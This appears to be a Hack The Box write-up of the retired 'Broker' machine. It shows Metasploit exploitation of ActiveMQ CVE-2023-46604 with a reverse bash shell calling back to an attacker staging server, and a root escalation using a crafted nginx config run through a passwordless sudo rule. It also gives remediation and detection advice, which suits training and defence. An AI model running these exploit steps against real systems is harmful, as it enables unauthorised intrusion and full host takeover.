Hack The Box / Easy / Linux

Broker

An exposed Apache ActiveMQ 5.15.15 message broker is vulnerable to CVE-2023-46604, an unauthenticated OpenWire deserialization flaw that yields remote code execution. Metasploit delivers a malicious Spring XML object to port 61616 and returns a shell as the activemq service user. A passwordless sudo rule for the nginx binary then escalates to root by loading an attacker-controlled configuration.

Retired machine · validated walkthrough · Authorized laboratory assessment · Reviewed: 2026-10-03

Dylan Senez / D4RKGUNN3R

ActiveMQ, deserialization, CVE-2023-46604, sudo abuse, nginx

Case overview

Outcome

CVE-2023-46604 gave a command shell as the activemq user and the user.txt proof; sudo -l exposed NOPASSWD: /usr/sbin/nginx, and a custom nginx configuration that served the whole filesystem as root exposed root.txt over HTTP. Both flags captured via a fully unauthenticated external path.

Key takeaway

Message brokers are RCE surfaces: an outdated ActiveMQ on the network plus a sudo rule that lets a service account control a binary's configuration is enough for full compromise.

Validated steps were directly reproduced. Documented steps are supported by preserved artifacts. Staged steps remain incomplete or await evidence.

Attack path

  • Full TCP sweep reveals ActiveMQ 5.15.15 (OpenWire 61616) plus MQTT, AMQP and STOMP
  • Metasploit confirms CVE-2023-46604 on the OpenWire transport
  • Malicious Spring XML object delivered via OpenWire -> shell as activemq
  • user.txt captured from /home/activemq
  • sudo -l shows NOPASSWD: /usr/sbin/nginx
  • Malicious nginx config serves / as root on port 1337
  • curl 127.0.0.1:1337/root/root.txt returns the root proof

1. Reconnaissance — Full TCP scan and service fingerprinting

Validated · Kali / attacker · EVD-001

Artifact

Broker.nmap

Command / request

nmap -sV -sC -p- 192.0.2.10 -T4 --min-rate 5000 -oA Broker

Observed result

22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
80/tcp    open  http     nginx 1.18.0 (Ubuntu)  [401 Unauthorized, basic realm=ActiveMQRealm]
1883/tcp  open  mqtt
5672/tcp  open  amqp?
8161/tcp  open  http     Jetty 9.4.39.v20210325  [401 Unauthorized, basic realm=ActiveMQRealm]

61614/tcp open  http     Jetty 9.4.39.v20210325  [http-methods: risky TRACE]
61616/tcp open  apachemq ActiveMQ OpenWire transport 5.15.15

Analysis

The scan exposes a full ActiveMQ deployment across several protocols. The OpenWire connector reports version 5.15.15, which is known to be vulnerable to CVE-2023-46604, and the surrounding nginx/Jetty front ends give context for the broker's management surface.

Why this mattered

Identifies the exact middleware and version that maps to a critical unauthenticated RCE.

2. Exploitation — Confirm the ActiveMQ vulnerability

Validated · Kali / attacker · EVD-002

Command / request

nmap -sV -p 61616 192.0.2.10
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOST 192.0.2.10
check

Observed result

61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
[+] 192.0.2.10:61616 - The target appears to be vulnerable. Apache ActiveMQ 5.15.15

Analysis

The version banner and the module's automated check both confirm CVE-2023-46604. The flaw lets an unauthenticated client send a serialized object that the broker deserializes, which in this case loads a remote Spring XML configuration.

Why this mattered

Verifies exploitability before committing to the RCE payload.

3. Exploitation — Deliver the malicious object and obtain a shell as activemq

Validated · Kali / attacker · EVD-003

set target 1
set payload cmd/unix/reverse_bash
run

Observed result

[*] 192.0.2.10:61616 - Using URL: http://198.51.100.10:8081/xjr9itIiNbDR
[*] 192.0.2.10:61616 - Sent ClassPathXmlApplicationContext configuration file.

landing directory: /opt/activemq/bin

Analysis

The broker fetched and processed the attacker-supplied XML, executing the embedded payload and connecting back. The session lands as the activemq service user inside the installation directory, and reading user.txt confirms a valid foothold.

Why this mattered

Achieves unauthenticated remote code execution as the service account, which is the prerequisite for local escalation.

4. Internal Enumeration — Enumerate sudo rights for the activemq user

Validated · Kali / attacker (activemq shell) · EVD-004

Command / request

sudo -l

Observed result

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx

Analysis

The broker account may run the nginx binary as root without a password and with no restriction on which configuration file it loads. Because nginx honours a caller-supplied config, this is effectively root access.

Why this mattered

Reveals a direct escalation path that requires no exploit against the binary itself.

5. Privilege Escalation — Serve the filesystem as root with a malicious nginx config

Validated · Kali / attacker (activemq shell) · EVD-005

Artifact

/tmp/privesc.conf

Command / request

cat > /tmp/privesc.conf << 'EOF'
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
EOF
sudo /usr/sbin/nginx -c /tmp/privesc.conf
curl http://127.0.0.1:1337/root/root.txt

Observed result

[REDACTED]

Analysis

Running nginx with the crafted configuration starts a root-owned web server that enumerates and serves the entire filesystem, so any protected file becomes readable over HTTP. Requesting /root/root.txt returns the root proof.

Why this mattered

Completes privilege escalation to root using only the misconfigured sudo rule.

Findings & remediation

F-1 — Apache ActiveMQ 5.15.15 exposed with CVE-2023-46604 (unauthenticated RCE)

Critical · Validated · 192.0.2.10:61616 (ActiveMQ OpenWire); related ports 80, 1883, 5672, 8161, 61613, 61614

Description

The host exposes Apache ActiveMQ 5.15.15 and multiple broker protocols. The OpenWire transport is vulnerable to CVE-2023-46604, an unauthenticated deserialization flaw (CWE-502) that lets a client cause the broker to load an attacker-controlled Spring XML configuration.

Impact

Unauthenticated remote code execution with the privileges of the ActiveMQ process user, leading to full host compromise and access to message data and credentials.

Root cause

An outdated ActiveMQ release with the vulnerable OpenWire deserialization path reachable from untrusted networks.

Remediation

  • Upgrade Apache ActiveMQ to a patched release (5.15.16, 5.16.7, 5.17.6 or 5.18.3+)
  • Restrict broker and management ports to trusted hosts and enforce authentication
  • Segment or decommission unnecessary messaging protocols
  • Monitor broker logs for malicious configuration loading

Validation

  • The ActiveMQ version was detected on 61616, the Metasploit module confirmed the target was vulnerable, and delivering the ClassPathXmlApplicationContext payload produced a shell as the activemq user.

F-2 — Passwordless sudo on the nginx binary enables root escalation

High · Validated · broker (local privilege escalation)

Description

The activemq user may run /usr/sbin/nginx via sudo with no password and no restriction on the configuration path (CWE-250 / CWE-269). Loading a caller-supplied config lets that user run nginx as root with arbitrary directives.

Impact

A low-privilege broker compromise escalates directly to root, allowing full read/write of the filesystem and complete system control.

Root cause

An over-broad sudoers entry grants a privileged binary without constraining its arguments, so the caller controls the file the binary trusts.

Remediation

  • Remove sudo access to /usr/sbin/nginx for the service account
  • If required, pin the rule to a single root-owned config (NOPASSWD: /usr/sbin/nginx -c /etc/nginx/nginx.conf)
  • Ensure only root can write to configuration paths and audit sudo rules for argument injection

Validation

  • sudo -l showed NOPASSWD: /usr/sbin/nginx; running nginx with an attacker config that set user root and served / returned /root/root.txt over HTTP.

F-3 — Messaging protocols exposed without authentication

Medium · Documented · 192.0.2.10:1883 (MQTT), 5672 (AMQP), 61613 (STOMP)

Description

MQTT, AMQP and STOMP endpoints are reachable from the external network. MQTT advisory topics were enumerable, and the STOMP endpoint returned an ActiveMQ fingerprint, indicating the protocols accept external connections.

Impact

Unauthenticated or weakly authenticated messaging access can expose queue contents, allow manipulation, and provide reconnaissance toward the underlying broker.

Root cause

Broker transport connectors are enabled and bound to all interfaces without authentication or network restriction.

Remediation

  • Enable authentication on every messaging endpoint
  • Restrict messaging ports to trusted networks and use TLS variants (MQTTS 8883, AMQPS 5671, STOMP+SSL 61612)
  • Disable connectors that are not required

Validation

  • nmap service detection and an MQTT topic listing showed the protocols responding; no exploitation of these specific endpoints was performed.

F-4 — HTTP TRACE method enabled on the Jetty endpoint

Low · Documented · 192.0.2.10:61614 (Jetty 9.4.39)

Description

The Jetty server on 61614 advertises the TRACE method (CWE-16 / CWE-693). TRACE can support cross-site tracing to bypass HTTPOnly cookie protections when combined with an XSS flaw.

Impact

Limited on its own; relevant only as a chained weakness that could aid session-cookie theft.

Root cause

Default Jetty configuration leaves TRACE enabled.

Remediation

  • Disable TRACE in the Jetty configuration
  • Review allowed HTTP methods and harden the server baseline

Validation

  • Nmap http-methods reported TRACE as a supported/risky method on 61614; no chained XSS was demonstrated.

Analysis

Broker chains a well-known middleware CVE with a mundane local misconfiguration. The externally reachable ActiveMQ 5.15.15 provided unauthenticated RCE without any credentials, and the resulting low-privilege shell was enough to read a sudoers entry granting full control of the nginx binary. Because nginx accepts an arbitrary configuration file, the service user could make it reload as root and hand back the entire filesystem over HTTP.

Remediation

  • Upgrade Apache ActiveMQ to a patched release (5.15.16, 5.16.7, 5.17.6 or 5.18.3+)
  • Firewall broker ports (61616, 8161, 1883, 5672, 61613, 61614) from untrusted networks
  • Remove the activemq sudo rule for /usr/sbin/nginx, or restrict it to an exact, root-owned config path
  • Run the broker as a dedicated unprivileged account with no shell or sudo rights
  • Disable TRACE and change any default management console credentials

Defender perspective

CVE-2023-46604 exploitation produces a distinctive pattern: the broker loads a Spring ClassPathXmlApplicationContext and fetches XML from an attacker-controlled HTTP server. Correlating outbound HTTP from the broker host with OpenWire traffic on 61616 catches most attempts. On the endpoint, alert on the service account invoking a privileged interpreter or web server binary, and treat any sudo rule that passes a caller-controlled config file as an escalation path.

Detection opportunities

  • Monitor ActiveMQ logs for ClassPathXmlApplicationContext loading and unusual outbound HTTP from the broker host
  • Alert on unexpected child processes spawned by the activemq service account
  • Watch for the activemq user running nginx or any privileged binary via sudo
  • Detect inbound connections to OpenWire (61616) and the admin console (8161) from external addresses

Lessons learned

  • A patch level in a banner (ActiveMQ 5.15.15) mapped directly to a critical CVE - keep middleware version-to-CVE mapping in the reconnaissance workflow
  • Exploit development is iterative: the first run failed on a port conflict and an incompatible payload before succeeding
  • A service account with sudo on a binary that reads an arbitrary config file is root-equivalent
  • Exposed messaging protocols (MQTT, AMQP, STOMP) multiplied the attack surface even though only OpenWire was exploited

Open questions

  • The export does not record the SSH port's exact banner interaction beyond OpenSSH 8.9p1, nor whether the admin console accepted default credentials
  • The full port-summary table was not preserved, so only the services referenced in the narrative are documented here

Troubleshooting & success factors

  • First exploit run failed because SRVPORT 8080 was already bound locally; changing the staging port resolved it
  • An initial attempt used a Windows payload against the Linux target, so no session returned; switching to cmd/unix/reverse_bash and the Linux target produced the shell
